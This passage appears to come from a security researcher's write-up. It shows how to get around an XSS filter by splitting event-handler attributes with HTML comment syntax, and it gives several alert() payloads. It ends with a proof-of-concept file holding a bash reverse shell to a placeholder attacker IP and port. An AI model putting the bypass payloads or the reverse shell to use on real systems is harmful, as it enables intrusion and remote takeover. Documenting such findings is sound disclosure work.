...
> New example: `<input autofocus on<--! -->focus=alert(1339) <--!`
...
The method that has been used to work around this mechanism is to use HTML [comments](https://www.w3schools.com/tags/tag_comment.asp).

Example: `<!--This is a comment. Comments are not displayed in the browser-->`. 
Valid payload: `test1"><img on<--! -->error=alert(1338) src="x`
...
File: <span style="color:red">poc.txt</span>
```bash
bash -i >& /dev/tcp/<IP_UNDER_CONTROL>/<PORT_UNDER_CONTROL> 0>&1
```

![alt text](https://github.com/therealcoiffeur/therealcoiffeur.github.io/blob/master/captures/c17_17.gif "Figure 18: POC")
